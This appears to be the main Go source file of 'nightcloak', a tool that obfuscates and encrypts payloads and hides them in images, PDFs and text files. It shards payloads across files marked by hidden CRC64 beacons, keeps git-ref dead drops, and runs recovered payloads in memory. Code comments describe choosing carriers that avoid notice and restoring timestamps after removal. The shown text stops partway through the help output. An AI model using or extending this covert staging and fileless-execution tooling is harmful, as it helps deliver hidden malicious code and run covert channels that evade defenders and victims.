package main

import (
	"fmt"
	"hash/crc64"
	"io"
	"io/fs"
	"math/rand"
	"os"
	"path/filepath"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/NumeXx/nightcloak/pkg/cloak"
	"github.com/NumeXx/nightcloak/pkg/cloak/native"
	"github.com/NumeXx/nightcloak/pkg/crypto"
	"github.com/NumeXx/nightcloak/pkg/gitdrop"
	"github.com/NumeXx/nightcloak/pkg/nightmare"
	"github.com/NumeXx/nightcloak/pkg/shard"
)

	const version = "0.9.9"

	const banner = `
	╔╗╔╦═╗╔═╗╦ ╦╔╦╗╔═╗╦  ╔═╗╔═╗╦╔═
	║║║║ ╠╣ ╦╠═╣ ║ ║  ║  ║ ║╠═╣╠╩╗
	╝╚╝╩═╝╚═╝╩ ╩ ╩ ╚═╝╩═╝╚═╝╩ ╩╩ ╩
	─── nightmare + cloak ── v%s ───
	`

	func main() {
	if len(os.Args) < 2 {
	        printUsage()
	        os.Exit(1)
	}

	switch os.Args[1] {
	case "hide":
	        cmdHide(os.Args[2:])
	case "reveal":
	        cmdReveal(os.Args[2:])
	case "wipe":
		cmdWipe(os.Args[2:])
	case "exec":
	        cmdExec(os.Args[2:])
	case "inspect":
	        cmdInspect(os.Args[2:])
	case "dump":
	        cmdDump(os.Args[2:])
	case "split":
		cmdSplit(os.Args[2:])
	case "gather":
		cmdGather(os.Args[2:])
	case "scan":
		cmdScan(os.Args[2:])
	case "git-hide":
		cmdGitHide(os.Args[2:])
	case "git-reveal":
		cmdGitReveal(os.Args[2:])
	case "git-wipe":
		cmdGitWipe(os.Args[2:])
	case "obfuscate":
	        cmdObfuscate(os.Args[2:])
	case "deobfuscate":
	        cmdDeobfuscate(os.Args[2:])
	case "-h", "--help", "help":
	        printHelp()
	case "-v", "--version", "version":
	        fmt.Printf("nightcloak %s\n", version)
	case "--thc":
	        printTHC()
	default:
	        die("unknown command: %s", os.Args[1])
	}
	}

	// ---------------------------------------------------------------------------
	// hide: nightmarify → encrypt → embed
	// ---------------------------------------------------------------------------
func cmdHide(args []string) {
	var password, output string
	var keepOriginal, compress, lock bool
	args = parseFlags(args, map[string]*string{
		"-p": &password, "--password": &password,
		"-o": &output, "--output": &output,
	}, map[string]*bool{
		"-k": &keepOriginal, "--keep": &keepOriginal,
		"-z": &compress, "--compress": &compress,
		"--lock": &lock,
	})

	// Auto-finder: if only one positional arg, treat it as payload and
	// discover the carrier from supported media files in the current tree.
	var carrierPath, payloadArg string
	switch len(args) {
	case 0:
		die("usage: nightcloak hide [<carrier>] <payload|file|-> [-p password] [-o output] [-k]")
	case 1:
		payloadArg = args[0]
		found, err := findCarrier()
		if err != nil {
			die("carrier auto-finder: %v", err)
		}
		carrierPath = found
		log("Auto-selected carrier: %s", carrierPath)
	default:
		carrierPath = args[0]
		payloadArg = args[1]
	}

	password = resolvePassword(password)

	// Determine payload source: file, stdin, or inline string.
	payload, payloadName, payloadType := resolvePayload(payloadArg)

	// Step 1: Nightmarify (obfuscate).
	obfuscated := nightmare.NightmarifyBytes(payload)

	// Step 2: Primary encrypt (v3: Argon2id + random padding, optional compression + machine lock).
	encrypted, err := crypto.EncryptV3([]byte(obfuscated), password, compress, lock)
	if err != nil {
		die("encryption failed: %v", err)
	}

	// Step 3: Optional secondary XChaCha20-Poly1305 layer (KEY env var).
	xkey, err := crypto.ResolveXKey()
	if err != nil {
		die("KEY resolution failed: %v", err)
	}
	if xkey != nil {
		encrypted, err = crypto.XEncrypt(encrypted, xkey)
		if err != nil {
			die("secondary encryption failed: %v", err)
		}
	}

	// Step 3: Embed via cloak.
	opts := cloak.HideOpts{
		CarrierPath: carrierPath,
		OutputPath:  output,
		Payload:     encrypted,
		PayloadName: payloadName,
		Type:        payloadType,
		Password:    password,
	}
	if keepOriginal && output == "" {
		// Generate a default output path to avoid overwriting.
		ext := filepath.Ext(carrierPath)
		stem := strings.TrimSuffix(carrierPath, ext)
		opts.OutputPath = stem + ".mod" + ext
	}

	if err := cloak.Hide(opts); err != nil {
		die("embedding failed: %v", err)
	}

	target := opts.OutputPath
	if target == "" {
		target = carrierPath
	}
	log("Payload hidden in %s", target)
}

// ---------------------------------------------------------------------------
// reveal: extract → decrypt → dreamify
// ---------------------------------------------------------------------------

func cmdReveal(args []string) {
	var password, output string
	args = parseFlags(args, map[string]*string{
		"-p": &password, "--password": &password,
		"-o": &output, "--output": &output,
	}, map[string]*bool{})

	if len(args) < 1 {
		die("usage: nightcloak reveal <carrier> [-p password] [-o output]")
	}

	carrierPath := args[0]

	password = resolvePassword(password)

	// Step 1: Extract via cloak.
	result, err := cloak.Reveal(carrierPath, password)
	if err != nil {
		die("extraction failed: %v", err)
	}

	raw := result.Payload

	// Step 2: Strip optional secondary XChaCha20 layer (KEY env var).
	xkey, err := crypto.ResolveXKey()
	if err != nil {
		die("KEY resolution failed: %v", err)
	}
	if xkey != nil {
		raw, err = crypto.XDecrypt(raw, xkey)
		if err != nil {
			die("secondary decryption failed: %v", err)
		}
	}

	// Step 3: Primary decrypt (ChaCha20-Poly1305 + PBKDF2).
	decrypted, err := crypto.Decrypt(raw, password)
	if err != nil {
		die("decryption failed: %v", err)
	}

	// Step 4: Dreamify (de-obfuscate).
	clearBytes, err := nightmare.DreamifyBytes(string(decrypted))
	if err != nil {
		die("de-obfuscation failed: %v", err)
	}

	// Output.
	if result.Type == cloak.PayloadFile && output == "" {
		output = result.PayloadName
	}

	if output != "" {
		if err := os.WriteFile(output, clearBytes, 0o644); err != nil {
			die("writing output file: %v", err)
		}
		log("Extracted to %s (%d bytes)", output, len(clearBytes))
	} else {
	        os.Stdout.Write(clearBytes)
	}
	}

	// ---------------------------------------------------------------------------
	// exec: extract → decrypt → dreamify → in-memory execution
	// ---------------------------------------------------------------------------

	func cmdExec(args []string) {
	var password string
	args = parseFlags(args, map[string]*string{
	        "-p": &password, "--password": &password,
	}, map[string]*bool{})

	if len(args) < 1 {
	        die("usage: nightcloak exec <carrier> [-- <args...>]")
	}

	carrierPath := args[0]
	execArgs := args[1:]

	password = resolvePassword(password)
	// Step 1: Extract via cloak.
	result, err := cloak.Reveal(carrierPath, password)
	if err != nil {
	        die("extraction failed: %v", err)
	}

	raw := result.Payload

	// Step 2: Strip optional secondary XChaCha20 layer (KEY env var).
	xkey, err := crypto.ResolveXKey()
	if err != nil {
	        die("KEY resolution failed: %v", err)
	}
	if xkey != nil {
	        raw, err = crypto.XDecrypt(raw, xkey)
	        if err != nil {
	                die("secondary decryption failed: %v", err)
	        }
	}

	// Step 3: Primary decrypt (ChaCha20-Poly1305 + PBKDF2).
	decrypted, err := crypto.Decrypt(raw, password)
	if err != nil {
	        die("decryption failed: %v", err)
	}

	// Step 4: Dreamify (de-obfuscate).
	clearBytes, err := nightmare.DreamifyBytes(string(decrypted))
	if err != nil {
	        die("de-obfuscation failed: %v", err)
	}

	// Step 5: Execute directly from memory.
	log("Executing payload in-memory...")
	if err := native.MemExec(clearBytes, execArgs); err != nil {
	        die("in-memory execution failed: %v", err)
	}
	}

	// ---------------------------------------------------------------------------
	// wipe: remove embedded payload, restore carrier to clean state
	// ---------------------------------------------------------------------------

func cmdWipe(args []string) {
	var password string
	args = parseFlags(args, map[string]*string{
		"-p": &password, "--password": &password,
	}, map[string]*bool{})

	if len(args) < 1 {
		die("usage: nightcloak wipe <carrier> [-p password]")
	}

	carrierPath := args[0]
	password = resolvePassword(password)

	if err := cloak.Wipe(carrierPath, password); err != nil {
		die("wipe failed: %v", err)
	}

	log("Payload removed from %s", carrierPath)
}

	// ---------------------------------------------------------------------------
	// inspect: show file metadata tags
	// ---------------------------------------------------------------------------
func cmdInspect(args []string) {
	if len(args) < 1 {
		die("usage: nightcloak inspect <file>")
	}

	data, err := cloak.Inspect(args[0])
	if err != nil {
		die("inspect failed: %v", err)
	}
	os.Stdout.Write(data)
	fmt.Println()
}

// ---------------------------------------------------------------------------
// dump: extract → decrypt → raw stdout (no de-obfuscation, no file write)
// ---------------------------------------------------------------------------

func cmdDump(args []string) {
	var password string
	args = parseFlags(args, map[string]*string{
		"-p": &password, "--password": &password,
	}, map[string]*bool{})

	if len(args) < 1 {
		die("usage: nightcloak dump <carrier> [-p password]")
	}

	carrierPath := args[0]

	password = resolvePassword(password)

	// Step 1: Extract.
	result, err := cloak.Reveal(carrierPath, password)
	if err != nil {
		die("extraction failed: %v", err)
	}

	raw := result.Payload

	// Step 2: Strip optional secondary XChaCha20 layer.
	xkey, err := crypto.ResolveXKey()
	if err != nil {
		die("KEY resolution failed: %v", err)
	}
	if xkey != nil {
		raw, err = crypto.XDecrypt(raw, xkey)
		if err != nil {
			die("secondary decryption failed: %v", err)
		}
	}

	// Step 3: Primary decrypt.
	decrypted, err := crypto.Decrypt(raw, password)
	if err != nil {
		die("decryption failed: %v", err)
	}

	// Dump raw decrypted bytes to stdout (still nightmarified).
	os.Stdout.Write(decrypted)
}

// ---------------------------------------------------------------------------
// obfuscate / deobfuscate: pure nightmare layer
// ---------------------------------------------------------------------------

func cmdObfuscate(args []string) {
	if len(args) < 1 {
		die("usage: nightcloak obfuscate <string|->")
	}

	input := readInlineOrStdin(args[0])
	fmt.Print(nightmare.Nightmarify(input))
}

func cmdDeobfuscate(args []string) {
	if len(args) < 1 {
		die("usage: nightcloak deobfuscate <string|->")
	}

	input := readInlineOrStdin(args[0])
	result, err := nightmare.Dreamify(input)
	if err != nil {
		die("de-obfuscation failed: %v", err)
	}
	fmt.Print(result)
}

// ---------------------------------------------------------------------------
// split: encrypt → RS split → inject shards into carriers → beacon-align
// ---------------------------------------------------------------------------

func cmdSplit(args []string) {
	var password, totalStr, minStr string
	args = parseFlags(args, map[string]*string{
		"-p": &password, "--password": &password,
		"-n": &totalStr,
		"-k": &minStr,
	}, map[string]*bool{})

	if len(args) < 2 {
		die("usage: nightcloak split <payload|file|-> <carrier_dir> [-n total] [-k min] [-p password]")
	}

	payloadArg := args[0]
	carrierDir := args[1]

	total := 6
	minRequired := 4
	if totalStr != "" {
		n, err := strconv.Atoi(totalStr)
		if err != nil || n < 2 {
			die("invalid -n value: %s", totalStr)
		}
		total = n
	}
	if minStr != "" {
		k, err := strconv.Atoi(minStr)
		if err != nil || k < 1 {
			die("invalid -k value: %s", minStr)
		}
		minRequired = k
	}
	if minRequired >= total {
		die("-k (%d) must be less than -n (%d)", minRequired, total)
	}
	parityShards := total - minRequired

	password = resolvePassword(password)

	// Read and encrypt the payload (same pipeline as hide).
	payload, _, _ := resolvePayload(payloadArg)
	obfuscated := nightmare.NightmarifyBytes(payload)
	encrypted, err := crypto.Encrypt([]byte(obfuscated), password)
	if err != nil {
		die("encryption failed: %v", err)
	}
	xkey, err := crypto.ResolveXKey()
	if err != nil {
		die("KEY resolution failed: %v", err)
	}
	if xkey != nil {
		encrypted, err = crypto.XEncrypt(encrypted, xkey)
		if err != nil {
			die("secondary encryption failed: %v", err)
		}
	}

	// Split encrypted payload into Reed-Solomon shards.
	shards, err := shard.Split(encrypted, minRequired, parityShards, password)
	if err != nil {
		die("shard split failed: %v", err)
	}

	// Find N carrier files in the carrier directory.
	carriers, err := findCarriersInDir(carrierDir, total)
	if err != nil {
		die("finding carriers in %s: %v", carrierDir, err)
	}

	// Inject each shard into a carrier then append beacon alignment bytes.
	distributed := 0
	for i, shardData := range shards {
		carrier := carriers[i]

		opts := cloak.HideOpts{
			CarrierPath: carrier,
			Payload:     shardData, // raw shard bytes (manifest + RS data), already encrypted
			Type:        cloak.PayloadString,
			Password:    password,
		}
		if err := cloak.Hide(opts); err != nil {
			log("shard %d: inject into %s failed: %v", i, carrier, err)
			continue
		}

		// Append 8 beacon-alignment bytes after the carrier's format boundary.
		// Native parsers (JPEG/PNG/MP3/PDF) stop at their respective EOF markers;
		// the appended bytes are invisible to standard tools.
		if err := appendBeaconAlignment(carrier, password); err != nil {
			log("shard %d: beacon alignment on %s failed: %v", i, carrier, err)
			continue
		}

		distributed++
	}

	if distributed == 0 {
		die("no shards could be distributed")
	}
	fmt.Fprintf(os.Stderr, "  [*] %d/%d shards distributed (recover with any %d)\n",
		distributed, total, minRequired)
}

// appendBeaconAlignment reads the carrier file at path, computes the 8-byte
// forced-match suffix, and appends it so that crc64(file) == beacon target.
func appendBeaconAlignment(path, password string) error {
	data, err := os.ReadFile(path)
	if err != nil {
		return err
	}
	ecmaTable := crc64.MakeTable(crc64.ECMA)
	current := crc64.Checksum(data, ecmaTable)
	target := shard.DeriveBtarget(password)
	padding := shard.FindPadding(current, target)
	f, err := os.OpenFile(path, os.O_APPEND|os.O_WRONLY, 0)
	if err != nil {
		return err
	}
	defer f.Close()
	_, err = f.Write(padding[:])
	return err
}

// findCarriersInDir collects exactly n distinct carrier files from dir.
// All candidates are shuffled and the first n are returned — no quartile
// restriction, since every slot needs a unique file.
func findCarriersInDir(dir string, n int) ([]string, error) {
	var candidates []string
	err := filepath.WalkDir(dir, func(path string, d fs.DirEntry, err error) error {
		if err != nil || d.IsDir() || !carrierExtensions[strings.ToLower(filepath.Ext(path))] {
			return nil
		}
		candidates = append(candidates, path)
		return nil
	})
	if err != nil {
		return nil, err
	}
	if len(candidates) < n {
		return nil, fmt.Errorf("need %d carriers, found %d supported files in %s", n, len(candidates), dir)
	}
	rand.Shuffle(len(candidates), func(i, j int) { candidates[i], candidates[j] = candidates[j], candidates[i] })
	return candidates[:n], nil
}

// ---------------------------------------------------------------------------
// gather: beacon scan → group by PayloadID → RS join → decrypt → output
// ---------------------------------------------------------------------------

func cmdGather(args []string) {
	var password, output string
	var execute bool
	args = parseFlags(args, map[string]*string{
		"-p": &password, "--password": &password,
		"-o": &output, "--output": &output,
	}, map[string]*bool{
		"--exec": &execute,
	})

	if len(args) < 1 {
		die("usage: nightcloak gather <search_dir> [-p password] [-o output] [--exec] [-- <args...>]")
	}

	searchDir := args[0]

	// Strict -- separator: exec args are only what follows "--", never
	// bare positionals after searchDir.
	var execArgs []string
	for i, a := range args {
		if a == "--" {
			execArgs = args[i+1:]
			break
		}
	}

	password = resolvePassword(password)

	// Step 1: Beacon scan.
	log("Scanning %s for beacon-matching carriers...", searchDir)
	found, err := shard.Scan(searchDir, password)
	if err != nil {
		die("scan failed: %v", err)
	}
	if len(found) == 0 {
		die("no beacon-matching files found in %s", searchDir)
	}
	log("Found %d candidate(s)", len(found))

	// Step 2: Parallel extraction — pass already-loaded Content directly into
	// cloak.RevealReader, eliminating the second disk read that cloak.Reveal
	// would otherwise perform.
	//
	// Producer-consumer: grouping runs in the main goroutine concurrently with
	// extraction. Peak memory is proportional to NumCPU in-flight jobs rather
	// than len(found) total payloads buffered before any grouping starts.
	type extractResult struct {
		path    string
		payload []byte
		err     error
	}

	// Step 3 state declared here so the drain loop below can write into it
	// while workers are still running.
	type shardGroup struct {
		total    int
		shards   map[int][]byte
		manifest shard.Manifest
	}
	groups := make(map[[32]byte]*shardGroup)

	workers := runtime.NumCPU()
	if workers > len(found) {
		workers = len(found)
	}

	type job struct{ r shard.ScanResult }
	jobs := make(chan job, len(found))
	for _, r := range found {
		jobs <- job{r}
	}
	close(jobs)

	results := make(chan extractResult, workers*2)

	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for j := range jobs {
				ext := strings.ToLower(filepath.Ext(j.r.Path))
				res, err := cloak.RevealReader(j.r.Content, ext, password)
				if err != nil {
					results <- extractResult{path: j.r.Path, err: err}
					continue
				}
				results <- extractResult{path: j.r.Path, payload: res.Payload}
			}
		}()
	}

	// Close results once all workers have exited — in a separate goroutine so
	// the main goroutine can drain concurrently rather than blocking on wg.Wait
	// before processing begins.
	go func() { wg.Wait(); close(results) }()

	// Step 3: Group extracted shards by PayloadID, inline as results arrive.
	for res := range results {
		if res.err != nil {
			log("skipping %s: %v", res.path, res.err)
			continue
		}
		m, err := shard.DecodeManifest(res.payload)
		if err != nil {
			log("skipping %s: manifest decode failed: %v", res.path, err)
			continue
		}
		g, ok := groups[m.PayloadID]
		if !ok {
			g = &shardGroup{
				total:  int(m.DataShards) + int(m.ParityShards),
				shards: make(map[int][]byte),
			}
			groups[m.PayloadID] = g
		}
		g.shards[int(m.ShardIndex)] = res.payload
		g.manifest = m
	}

	if len(groups) == 0 {
		die("no valid shard manifests found")
	}

	// Step 4: Select the best reconstructable group.
	// Prefer groups that already have >= DataShards shards (can reconstruct now).
	// Fall back to the most complete group and report how many more are needed.
	var bestGroup *shardGroup
	for _, g := range groups {
		if len(g.shards) >= int(g.manifest.DataShards) {
			if bestGroup == nil || len(g.shards) > len(bestGroup.shards) {
				bestGroup = g
			}
		}
	}
	if bestGroup == nil {
		// No group meets the reconstruction threshold — report the deficit.
		var closest *shardGroup
		for _, g := range groups {
			if closest == nil || len(g.shards) > len(closest.shards) {
				closest = g
			}
		}
		need := int(closest.manifest.DataShards) - len(closest.shards)
		die("not enough shards for reconstruction — have %d/%d, need %d more",
			len(closest.shards), closest.total, need)
	}

	encodedShards := make([][]byte, bestGroup.total)
	for idx, data := range bestGroup.shards {
		encodedShards[idx] = data
	}

	log("Reconstructing from %d/%d shards (need %d)...",
		len(bestGroup.shards), bestGroup.total, bestGroup.manifest.DataShards)

	assembled, err := shard.Join(encodedShards, password)
	if err != nil {
		die("Reed-Solomon reconstruction failed: %v", err)
	}

	// Step 5: Reverse the encryption pipeline.
	raw := assembled

	xkey, err := crypto.ResolveXKey()
	if err != nil {
		die("KEY resolution failed: %v", err)
	}
	if xkey != nil {
		raw, err = crypto.XDecrypt(raw, xkey)
		if err != nil {
			die("secondary decryption failed: %v", err)
		}
	}

	decrypted, err := crypto.Decrypt(raw, password)
	if err != nil {
		die("decryption failed: %v", err)
	}

	clearBytes, err := nightmare.DreamifyBytes(string(decrypted))
	if err != nil {
		die("de-obfuscation failed: %v", err)
	}

	// Step 6: Output or execution.
	if execute {
		log("Executing reconstructed payload in-memory...")
		if err := native.MemExec(clearBytes, execArgs); err != nil {
			die("in-memory execution failed: %v", err)
		}
		return
	}

	if output != "" {
		if err := os.WriteFile(output, clearBytes, 0o644); err != nil {
			die("writing output: %v", err)
		}
		log("Recovered %d bytes → %s", len(clearBytes), output)
	} else {
		os.Stdout.Write(clearBytes)
	}
}

// ---------------------------------------------------------------------------
// scan: print paths of all beacon-matching files in a directory tree
// ---------------------------------------------------------------------------

func cmdScan(args []string) {
	var password string
	args = parseFlags(args, map[string]*string{
		"-p": &password, "--password": &password,
	}, map[string]*bool{})

	if len(args) < 1 {
		die("usage: nightcloak scan <dir> [-p password]")
	}

	dir := args[0]
	password = resolvePassword(password)

	found, err := shard.Scan(dir, password)
	if err != nil {
		die("scan failed: %v", err)
	}

	for _, r := range found {
		fmt.Println(r.Path)
	}
	fmt.Fprintf(os.Stderr, "  [*] %d file(s) matched\n", len(found))
}

// ---------------------------------------------------------------------------
// payload resolution
// ---------------------------------------------------------------------------

func resolvePayload(arg string) (data []byte, name string, pt cloak.PayloadType) {
	// Stdin.
	if arg == "-" {
		data, err := io.ReadAll(os.Stdin)
		if err != nil {
			die("reading stdin: %v", err)
		}
		return data, "stdin", cloak.PayloadFile
	}

	info, statErr := os.Stat(arg)

	// Directory → zip in-memory, then embed as file payload.
	if statErr == nil && info.IsDir() {
		log("Compressing folder %s...", arg)
		zipData, zipName, err := cloak.ZipFolder(arg)
		if err != nil {
			die("compressing folder: %v", err)
		}
		log("Compressed to %s (%d bytes)", zipName, len(zipData))
		return zipData, zipName, cloak.PayloadFile
	}

	// File.
	if statErr == nil && !info.IsDir() {
		data, err := os.ReadFile(arg)
		if err != nil {
			die("reading file %s: %v", arg, err)
		}
		return data, filepath.Base(arg), cloak.PayloadFile
	}

	// Inline string.
	return []byte(arg), "", cloak.PayloadString
}

func readInlineOrStdin(arg string) string {
	if arg == "-" {
		data, err := io.ReadAll(os.Stdin)
		if err != nil {
			die("reading stdin: %v", err)
		}
		return strings.TrimRight(string(data), "\n")
	}
	return arg
}

// ---------------------------------------------------------------------------
// flag parsing (zero-dependency, handles intermixed flags and positionals)
// ---------------------------------------------------------------------------

func parseFlags(args []string, strFlags map[string]*string, boolFlags map[string]*bool) []string {
	var positional []string
	for i := 0; i < len(args); i++ {
		if dest, ok := strFlags[args[i]]; ok {
			if i+1 >= len(args) {
				die("flag %s requires a value", args[i])
			}
			i++
			*dest = args[i]
		} else if dest, ok := boolFlags[args[i]]; ok {
			*dest = true
		} else if args[i] == "--" {
			positional = append(positional, args[i+1:]...)
			break
		} else {
			positional = append(positional, args[i])
		}
	}
	return positional
}

// ---------------------------------------------------------------------------
// carrier auto-finder
// ---------------------------------------------------------------------------

// carrierExtensions are the file types eligible for automatic carrier selection.
var carrierExtensions = map[string]bool{
	".png": true, ".jpg": true, ".jpeg": true, ".pdf": true,
	".txt": true, ".md": true, ".html": true, ".htm": true,
	".json": true, ".xml": true, ".csv": true,
}

type carrierCandidate struct {
	path  string
	mtime time.Time
}

// findCarrier walks the current directory tree and returns a carrier file
// from the 2nd or 3rd quartile of the mtime distribution (files that are
// old enough to be unremarkable but not so old as to stand out as artifacts).
// Falls back to a random pick if fewer than 4 candidates exist.
func findCarrier() (string, error) {
	var candidates []carrierCandidate

	err := filepath.WalkDir(".", func(path string, d fs.DirEntry, err error) error {
		if err != nil {
			return nil // skip unreadable entries
		}
		if d.IsDir() || !carrierExtensions[strings.ToLower(filepath.Ext(path))] {
			return nil
		}
		info, err := d.Info()
		if err != nil {
			return nil
		}
		candidates = append(candidates, carrierCandidate{path: path, mtime: info.ModTime()})
		return nil
	})
	if err != nil {
		return "", err
	}
	if len(candidates) == 0 {
		return "", fmt.Errorf("no suitable carrier found (.png/.jpg/.jpeg/.pdf) in current directory tree")
	}

	// Sort oldest → newest.
	sort.Slice(candidates, func(i, j int) bool {
		return candidates[i].mtime.Before(candidates[j].mtime)
	})

	// Select from Q2/Q3 when there are enough candidates; otherwise pick randomly.
	var pool []carrierCandidate
	n := len(candidates)
	if n >= 4 {
		q1 := n / 4
		q3 := (3 * n) / 4
		pool = candidates[q1:q3]
	} else {
		pool = candidates
	}

	chosen := pool[rand.Intn(len(pool))]
	abs, _ := filepath.Abs(chosen.path)
	fmt.Fprintf(os.Stderr, "  [carrier] %s\n", abs)
	return chosen.path, nil
}

// ---------------------------------------------------------------------------
// password resolution
// ---------------------------------------------------------------------------

// resolvePassword returns the password from, in priority order:
//  1. The explicit flag value (-p / --password)
//  2. The NIGHT_PASSWORD environment variable
//  3. An interactive terminal prompt
func resolvePassword(explicit string) string {
	if explicit != "" {
		return explicit
	}
	if env := os.Getenv("NIGHT_PASSWORD"); env != "" {
		return env
	}
	fmt.Fprint(os.Stderr, "Enter password: ")
	var pw string
	fmt.Scanln(&pw)
	if pw == "" {
		die("password cannot be empty")
	}
	return pw
}

// ---------------------------------------------------------------------------
// git-hide: encrypt payload → store as git blob under custom ref
// ---------------------------------------------------------------------------

func cmdGitHide(args []string) {
	var password, token, ref string
	var compress, lock bool
	args = parseFlags(args, map[string]*string{
		"-p": &password, "--password": &password,
		"-t": &token, "--token": &token,
		"-r": &ref, "--ref": &ref,
	}, map[string]*bool{
		"-z": &compress, "--compress": &compress,
		"--lock": &lock,
	})

	if len(args) < 2 {
		die("usage: nightcloak git-hide <payload|file|-> <repo-url> [-p password] [-t token] [-r ref]")
	}

	payloadArg := args[0]
	repoURL := args[1]

	password = resolvePassword(password)
	token = resolveGitToken(token)
	if ref == "" {
		ref = gitdrop.DefaultRef
	}

	payload, _, _ := resolvePayload(payloadArg)

	obfuscated := nightmare.NightmarifyBytes(payload)

	encrypted, err := crypto.EncryptV3([]byte(obfuscated), password, compress, lock)
	if err != nil {
		die("encryption failed: %v", err)
	}

	xkey, err := crypto.ResolveXKey()
	if err != nil {
		die("KEY resolution failed: %v", err)
	}
	if xkey != nil {
		encrypted, err = crypto.XEncrypt(encrypted, xkey)
		if err != nil {
			die("secondary encryption failed: %v", err)
		}
	}

	client, err := gitdrop.NewClient(repoURL, token)
	if err != nil {
		die("invalid repo URL: %v", err)
	}

	if err := client.Hide(encrypted, ref); err != nil {
		die("git-hide failed: %v", err)
	}

	log("Payload stored at %s → %s", repoURL, ref)
}

// ---------------------------------------------------------------------------
// git-reveal: fetch git blob → decrypt → de-obfuscate
// ---------------------------------------------------------------------------

func cmdGitReveal(args []string) {
	var password, token, ref, output string
	var execute bool
	args = parseFlags(args, map[string]*string{
		"-p": &password, "--password": &password,
		"-t": &token, "--token": &token,
		"-r": &ref, "--ref": &ref,
		"-o": &output, "--output": &output,
	}, map[string]*bool{
		"--exec": &execute,
	})

	if len(args) < 1 {
		die("usage: nightcloak git-reveal <repo-url> [-p password] [-t token] [-r ref] [-o output] [--exec]")
	}

	repoURL := args[0]
	execArgs := args[1:]

	password = resolvePassword(password)
	token = resolveGitToken(token)
	if ref == "" {
		ref = gitdrop.DefaultRef
	}

	client, err := gitdrop.NewClient(repoURL, token)
	if err != nil {
		die("invalid repo URL: %v", err)
	}

	ciphertext, err := client.Reveal(ref)
	if err != nil {
		die("git-reveal failed: %v", err)
	}

	raw := ciphertext

	xkey, err := crypto.ResolveXKey()
	if err != nil {
		die("KEY resolution failed: %v", err)
	}
	if xkey != nil {
		raw, err = crypto.XDecrypt(raw, xkey)
		if err != nil {
			die("secondary decryption failed: %v", err)
		}
	}

	decrypted, err := crypto.Decrypt(raw, password)
	if err != nil {
		die("decryption failed: %v", err)
	}

	clearBytes, err := nightmare.DreamifyBytes(string(decrypted))
	if err != nil {
		die("de-obfuscation failed: %v", err)
	}

	if execute {
		log("Executing payload in-memory...")
		if err := native.MemExec(clearBytes, execArgs); err != nil {
			die("in-memory execution failed: %v", err)
		}
		return
	}

	if output != "" {
		if err := os.WriteFile(output, clearBytes, 0o644); err != nil {
			die("writing output: %v", err)
		}
		log("Extracted to %s (%d bytes)", output, len(clearBytes))
	} else {
		os.Stdout.Write(clearBytes)
	}
}

// ---------------------------------------------------------------------------
// git-wipe: delete the ref from the remote repo
// ---------------------------------------------------------------------------

func cmdGitWipe(args []string) {
	var token, ref string
	args = parseFlags(args, map[string]*string{
		"-t": &token, "--token": &token,
		"-r": &ref, "--ref": &ref,
	}, map[string]*bool{})

	if len(args) < 1 {
		die("usage: nightcloak git-wipe <repo-url> [-t token] [-r ref]")
	}

	repoURL := args[0]
	token = resolveGitToken(token)
	if ref == "" {
		ref = gitdrop.DefaultRef
	}

	client, err := gitdrop.NewClient(repoURL, token)
	if err != nil {
		die("invalid repo URL: %v", err)
	}

	if err := client.Wipe(ref); err != nil {
		die("git-wipe failed: %v", err)
	}

	log("Ref %s deleted from %s", ref, repoURL)
}

func resolveGitToken(explicit string) string {
	if explicit != "" {
		return explicit
	}
	if env := os.Getenv("NIGHTCLOAK_GIT_TOKEN"); env != "" {
		return env
	}
	die("GitHub token required: use -t <token> or set NIGHTCLOAK_GIT_TOKEN")
	return ""
}

func printTHC() {
	fmt.Fprintln(os.Stderr, `
  The Hacker's Choice -- https://www.thc.org

  This tool carries the spirit of THC's work: small, sharp, and silent.
  The steganography philosophy and the "nightmare" obfuscation chain
  were directly inspired by the techniques pioneered by Doctor Who (Jiab77) & Skyper.`)
}

// ---------------------------------------------------------------------------
// output helpers
// ---------------------------------------------------------------------------

func printUsage() {
	fmt.Fprintf(os.Stderr, banner, version)
	fmt.Fprintln(os.Stderr, `
  Usage: nightcloak <command> [options]

  Commands:
    hide          Obfuscate, encrypt, and embed payload in a carrier file
    reveal        Extract, decrypt, and de-obfuscate payload from carrier
    wipe          Remove embedded payload, restore carrier to clean state
    split         Encrypt, RS-shard, and distribute across multiple carriers
    gather        Beacon-scan, reconstruct, and recover distributed payload
    scan          List all beacon-matching files in a directory tree
    exec          Direct in-memory execution of payload (Linux only)
    git-hide      Encrypt and store payload as a git blob dead drop
    git-reveal    Fetch and decrypt payload from a git repo dead drop
    git-wipe      Delete the dead drop ref from the remote repo
    inspect       Show file metadata tags (no decryption)
    dump          Extract and decrypt to stdout (raw, no de-obfuscation)
    obfuscate     Pure nightmare encoding (no encryption)
    deobfuscate   Reverse nightmare encoding

  Run 'nightcloak <command> --help' or 'nightcloak help' for details.`)
}

func printHelp() {
	fmt.Fprintf(os.Stderr, banner, version)
	fmt.Fprintln(os.Stderr, `
  Usage: nightcloak <command> [options]

  Commands:

    hide <carrier> <payload|file|folder|-> [flags]
        Obfuscate → Encrypt → Embed payload into carrier file metadata.
        Folders are automatically zipped before embedding.

        -p, --password <pw>   Encryption password (prompted if omitted)
        -o, --output <path>   Write to path instead of replacing carrier
        -k, --keep            Keep original carrier (auto-generates output path)

        Carriers: .png .jpg .jpeg .mp3 .pdf (metadata injection)
                  .txt .md .html .json .xml .csv (Unicode zero-width chars)

        Examples:
          nightcloak hide photo.jpg "secret message" -p mypass
          nightcloak hide photo.jpg secret.txt -p mypass
          nightcloak hide README.md secret.txt -p mypass
          nightcloak hide photo.jpg ./secret_folder/ -p mypass -k
          cat payload.bin | nightcloak hide photo.jpg - -p mypass

    reveal <carrier> [flags]
        Extract → Decrypt → De-obfuscate payload from carrier file.

        -p, --password <pw>   Decryption password (prompted if omitted)
        -o, --output <path>   Write to path instead of stdout/original name

        Examples:
          nightcloak reveal photo.jpg -p mypass
          nightcloak reveal photo.jpg -p mypass -o recovered.txt

    wipe <carrier> [flags]
        Remove the embedded payload from a carrier file. The file is rewritten
        in-place without the nightcloak data. Timestamps are restored.

        -p, --password <pw>   Password used during hide (prompted if omitted)

        Examples:
          nightcloak wipe photo.jpg -p mypass
          nightcloak wipe document.pdf -p mypass

    split <payload|file|-> <carrier_dir> [flags]
        Encrypt → RS-shard → Inject into N carriers → CRC64 beacon-align.
        Any K carriers are sufficient to recover the original payload.

